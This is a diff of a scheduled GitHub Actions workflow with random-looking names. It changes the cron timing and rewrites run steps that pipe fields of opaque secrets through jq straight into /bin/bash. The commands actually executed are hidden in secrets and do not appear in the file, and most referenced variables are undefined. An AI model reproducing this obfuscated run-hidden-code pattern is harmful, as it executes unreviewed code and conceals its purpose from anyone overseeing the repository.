@@ -2,7 +2,7 @@ name: jixiaxingliang
 on:
   workflow_dispatch:
   schedule:
-    - cron: '17 4/6 * * *'
+    - cron: '8 1/6 * * *'
 
 jobs:
   build:
@@ -11,18 +11,11 @@ jobs:
       - uses: actions/checkout@v4
       - name: jixiaxingliang
         env:
-          gonsh5: ${{ secrets.gonsh5 }}
+          p97937: ${{ secrets.p97937 }}
         run: |
-          echo $gonsh5 | jq -r .tz49381 | /bin/bash
-          echo $c60807 | jq -r .axhjd8 | /bin/bash
-          echo $wm98957 | jq -r .dpk6 | /bin/bash
-          echo $dmxk11476 | jq -r .gchr140 | /bin/bash
-          echo $omj542 | jq -r .poejq518 | /bin/bash
-          echo $ohmf0250 | jq -r .ylfvb57482 | /bin/bash
-          echo $whbaw3 | jq -r .s502 | /bin/bash
-          echo $wzas7589 | jq -r .vwafs0 | /bin/bash
-          echo $ayqh8 | jq -r .xsckx322 | /bin/bash
-          echo $ytkj08 | jq -r .mqu9 | /bin/bash
-          echo $dc4386 | jq -r .nkr1 | /bin/bash
-          echo $ck2072 | jq -r .ucu9088 | /bin/bash
+          echo $p97937 | jq -r .jzwz8 | /bin/bash
+          echo $e22589 | jq -r .aziz30 | /bin/bash
+          echo $phhwn54 | jq -r .ar2 | /bin/bash
+          echo $x965 | jq -r .c513 | /bin/bash
+          echo $mfxj53 | jq -r .nspcj08058 | /bin/bash
 
